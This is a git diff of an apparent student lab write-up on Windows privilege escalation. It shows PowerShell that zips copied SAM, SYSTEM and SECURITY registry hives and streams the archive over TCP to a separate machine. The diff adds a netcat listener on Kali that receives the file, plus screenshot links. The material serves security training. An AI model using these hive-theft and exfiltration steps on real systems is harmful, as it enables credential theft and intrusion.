@@ -1,4 +1,4 @@
-
+<img width="2511" height="1519" alt="image" src="https://github.com/user-attachments/assets/7a68b894-01e9-49ef-b952-d3e1cea808fd" />
 ## Windows PrivEsc, task 1:
 
 ---
@@ -57,6 +57,8 @@ Severity: HIGH
 Compress-Archive -Path "C:\Users\Sammy\Desktop\SYSTEM-2025-02-11", "C:\Users\Sammy\Desktop\SECURITY-2025-02-11", "C:\Users\Sammy\Desktop\SAM-2025-01-15" -DestinationPath "C:\Users\Sammy\Desktop\hives.zip"
 ```
 
+> Then send it.
+
 ```powershell
 [System.IO.File]::WriteAllBytes("hives.zip", (Get-Content "C:\Users\Sammy\Desktop\hives.zip" -Encoding Byte))
 $client = New-Object System.Net.Sockets.TcpClient("172.16.220.130", 80)
@@ -65,3 +67,13 @@ $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Sammy\Desktop\hives.zip")
 $stream.Write($bytes, 0, $bytes.Length)
 $stream.Close(); $client.Close()
 ```
+
+![images](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2014-08-25.png)
+
+> Kali Linux:
+
+```shell
+nc -lvnp 80 > hives.zip
+```
+
+![images](https://github.com/Velatryx/holbertonschool-cyber_security/blob/main/privilege_escalation_security_win/windows_privsec/Images/Screenshot%20From%202026-07-18%2014-11-39.png)
